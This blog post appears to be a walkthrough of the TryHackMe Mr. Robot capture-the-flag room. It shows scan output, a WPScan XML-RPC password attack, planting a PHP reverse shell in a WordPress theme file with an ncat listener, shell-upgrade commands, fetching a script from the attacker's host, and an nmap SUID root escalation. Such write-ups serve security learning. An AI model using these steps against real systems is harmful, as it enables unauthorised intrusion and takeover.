---
slug: mrrobot
title: Mr. Robot CTF
authors: [hueami]
tags: [tryhackme, ctf, wordpress]
comments: true
---

## Solving the Mr. Robot CTF on TryHackMe

Hello fellow IT security enthusiasts! Today, I'm going to walk you through my process of solving the [Mr. Robot CTF](https://tryhackme.com/room/mrrobot) challenge on TryHackMe. This challenge is inspired by the popular TV series and it's all about recruiting you for fsociety. Let's dive in!

### Enumeration through nmap

<!-- truncate -->

The first step in any CTF challenge is reconnaissance. For this, I used `nmap`, a powerful open-source tool for network exploration and security auditing.

```bash
sudo nmap 10.10.1.157 -p0-

Nmap scan report for 10.10.1.157
Host is up (0.051s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
```

This basic nmap scan over all ports revealed that the SSH port was closed, but ports 80 (HTTP) and 443 (HTTPS) were open.

To gather more information, I ran a comprehensive nmap scan over the found ports:

```bash
sudo nmap 10.10.1.157 -p22,80,443 -sV -A

Nmap scan report for 10.10.1.157
Host is up (0.054s latency).

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
Device type: general purpose|specialized|storage-misc|WAP|printer
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (88%), Crestron 2-Series (87%), HP embedded (87%), Asus embedded (86%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.10 - 3.13 (88%), Linux 3.10 - 4.11 (88%), Linux 3.13 (88%), Linux 3.13 or 4.2 (88%), Linux 3.2 - 3.8 (88%), Linux 5.4 (88%), Linux 3.16 (87%), Linux 3.2 - 3.5 (87%), Linux 4.2 (87%), Linux 4.4 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   51.90 ms 10.8.0.1
2   51.99 ms 10.10.1.157
```

The scan confirmed that we have a web server running, serving an interactive website that is Mr. Robot themed and tries to recruit you for fsociety. Although I didn’t find anything particularly interesting on the page, it certainly added to the atmosphere of the CTF.

### Digging Deeper with Nikto

To dig deeper, I used `nikto`, another open-source web server scanner which performs comprehensive tests against web servers for multiple items, including potentially dangerous files and CGIs. Upon further investigation with `nikto`, I discovered an interesting `robots.txt` file and learned that the web server was serving a WordPress blog.

```bash
nikto -host http://10.10.1.157                                                                               [...]

+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://10.10.1.157/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ 7517 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2023-11-07 14:21:57 (GMT1) (608 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

 The `robots.txt` file contained the first part of the key and something that looked like a filename. This file could be downloaded and appeared to be a password list.

In addition to `nikto`, I also used `feroxbuster` to see if there were any hidden directories. However, `feroxbuster` didn't uncover anything further interesting, so I decided to focus on the WordPress finding.

### Enumerating WordPress with WPScan

To enumerate the WordPress instance, I used `WPScan`, a free and open-source black box WordPress vulnerability scanner.

```bash
wpscan --url http://10.10.1.157 --enumerate --api-token XXXXXX
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.1.157/ [10.10.1.157]
[+] Started: Tue Nov  7 14:35:23 2023

Interesting Finding(s):

[...]

[+] robots.txt found: http://10.10.1.157/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.1.157/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.10.1.157/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.1.157/3344bb6.html, Match: "wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1"
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.1.157/3344bb6.html, Match: "WordPress 4.3.1"
 |
 | [!] 110 vulnerabilities identified:
 |

[...]

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.1.157/wp-content/themes/twentyfifteen/
 | Last Updated: 2023-08-08T00:00:00.000Z
 | Readme: http://10.10.1.157/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.5
 | Style URL: http://10.10.1.157/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteens simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.1.157/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: "Version: 1.3"

[...]
```

The `WPScan` revealed some interesting findings: 110 vulnerabilities, the directory structure of the WordPress instance, and the fact that XML-RPC was enabled. This could be used to perform a dictionary attack to find a valid user-password combination, which is much faster than using the wp-login method. Unfortunately, I was not able to find a user - but I had the dictionary, which may contain the password.

### Cracking the admin password

Despite not finding a user, I decided to run the `WPScan` with the user `admin`, because why not? It's always worth trying the obvious!

```bash
wpscan --password-attack xmlrpc -t 20 -U admin -P ~/Downloads/xxxxxx.dic --url http://10.10.1.157
```

The dictionary was huge, and I wasted at least half an hour before I realized that there were duplicates in the dictionary. I removed the duplicates with awk, which reduced the size to about 12%.

```bash
awk '!seen[$0]++' ~/Downloads/xxxxxx.dic > xxxxxx.txt
```

The password attack with the user admin was not successful, so I tried mrrobot and then elliot. That finally was successful, and I had the password for the WordPress admin panel.

One way to perform a Remote Code Execution (RCE) on a WordPress instance is to edit a page so that it serves a PHP reverse shell. You can do this in the Appearance/Themes/Editor section. I replaced the content of the 404.php template with the pentestmonkey PHP reverse shell.

On my local machine, I started netcat to listen on the port I configured the reverse shell with:

```bash
ncat -lvp 6666
```

Then I called the 404.php page `http://10.10.1.157/wp-content/themes/twentyfifteen/404.php`.

Netcat got the connection, and I had access to the machine with the user daemon.

For higher comfort, I upgraded the reverse shell to an interactive TTY shell. First, I upgraded from shell to bash:

`SHELL=/bin/bash script -q /dev/null`  

Then I spawned bash via Python’s pty module:

`python -c 'import pty; pty.spawn("/bin/bash")'` 

For the full interactive TTY shell, I backgrounded my current remote shell, updated the local terminal line settings with stty, and foregrounded the remote shell again:

`stty raw -echo && fg`

### Enumerating the machine

The second key was located in /home/robot, but unfortunately, the file was only readable by robot. But there was another file readable by everyone. It contained a MD5 hash.

My first try was to check it on a rainbow table before trying to crack it myself, which can be really time-consuming. Luckily, the password was very easy and contained in the rainbow table of [crackstation](https://crackstation.net/).

With this password, I could switch to the user robot and read the keyfile that contained the second key.

The third key should be the root flag that is usually located in /root. I needed root privileges to read the file. At first, I tried some basic methods to escalate my privileges, but the user robot is unfortunately not allowed to use `sudo` and there was nothing interesting in the crontab. So I decided to let a script do the work for me and use linpeas.

Since the machine had no internet connection, I could not download the script from the GitHub repository, and I couldn’t `scp` the file to the machine because ssh was not running. So I used a Python web server:

`python3 -m http.server 6666`

and

`wget http://10.18.18.18:6666/linpeas.sh`

The execution of the `linpeas` script unfortunately failed repeatedly, so I used `linenum` instead.

### Privilege Escalation

`linenum` found that `nmap` had set the SUID bit. The SUID bit means that `nmap` is not executed with the permissions of the user that is executing it, but with the permission of its owner. And the owner is `root`.

I chose `nmap --interactive`:

```bash
nmap --interactive 
nmap> ! /bin/bash -p
bash-4.3# cat /root/key-3-of-3.txt
```

The content of the file was the last piece of information I needed to complete the CTF.

### Final Thoughts: Reflecting on the Mr. Robot CTF Journey

Looking back on my experience with the Mr. Robot CTF from TryHackMe, I can say it was an  rewarding journey. I remember the time when I first attempted this CTF and couldn’t make progress, even though it was rated as easy. Back then, I didn’t know about `wpscan`, a tool that proved to be invaluable.

Now, several months later, with more knowledge and experience under my belt, I was able to conquer that challeng. It was an enlightening process that showed me the importance of continuous learning and discovering new tools.

I had a lot of fun solving the puzzles and penetrating the various levels of the CTF. It was an exciting journey that has encouraged me to continue facing new challenges and improving my IT security skills.

I hope my experiences and insights can also be helpful to others embarking on the exciting journey of IT security. Remember to never give up, keep learning, and have fun. Because at the end of the day, that’s what matters.

Until next time, when we meet again in the fascinating world of IT security. Stay safe and curious!